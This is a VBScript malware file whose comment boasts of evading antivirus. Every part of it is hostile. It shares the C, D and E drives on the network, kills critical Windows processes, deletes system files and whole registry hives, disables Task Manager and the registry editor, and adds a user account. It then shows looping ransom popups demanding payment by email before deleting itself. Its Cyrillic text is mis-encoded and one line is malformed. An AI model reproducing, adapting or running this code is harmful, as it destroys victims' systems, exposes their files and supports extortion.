'is novirus not detected kasperom FIGA
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption","DANGER!!!","REG_SZ"
s.regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText","���� ������ ���-�� ���� ��� ��������� - ������� ��� 1000 ������� ! � ����� � ������ ���� ����������� !","REG_SZ"
s.run"net share c=c:\",0
s.run"net share d=d:\",0
s.run"net share e=e:\",0
s.regwrite"HKEY_CLASSES_ROOT\Network\SharingHandler\",""
s.regwrite"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http:\\www.rotten.com"
s.regwrite"HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoSelectDownloadDir","1","REG_DWORD"
s.regwrite"HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown\IExplorer","0","REG_DWORD"
s.regwrite"HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFindFiles","1","REG_DWORD"
s.regwrite"HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoNavButtons","1","REG_DWORD"
fso.deletefile "explorer.exe",1 
fso.deletefile "pncrt.dll",1 
fso.deletefile "wowexec.exe",1 
s.run"ssflwbox.scr",1
s.run"systray.exe",1
s.runspider.exe",1
s.run"winchat.exe",0
s.run"win.com",0
s.run"stimon.exe",0
s.run"taskkill /f /im smss.exe",0 
s.run"taskkill /f /im csrss.exe",0 
s.run"taskkill /f /im explorer.exe",0 
s.run"taskkill /f /im infium.exe",0 
s.regdelete "HKEY_CURRENT_CONFIG" 
s.regdelete "HKEY_USERS" 
s.regdelete "HKEY_CLASSES_ROOT" 
s.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE","zl)(b" 
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
Set IE = CreateObject("InternetExplorer.Application") 
IE.Visible = 1 
IE.Navigate "http:\\www.poetryrotten.com" 
While IE.Busy
WScript.Sleep 200
Wend
s.run"net user %LK% 123 /add",0
i=555
while i>0 or i<0
S.popup "���������� ! �� ������� ���� ������� ! ����� 20000 �������� �� e-mail : cellerz.mail.ru � � ����� ���� ����������� ! ����� - ���� ��������� � ���� ����� ! ����������� ! ",9999, "dont worry - be happy !",0+0
i=i-1
wend

fso.deletefile wscript.scriptfullname

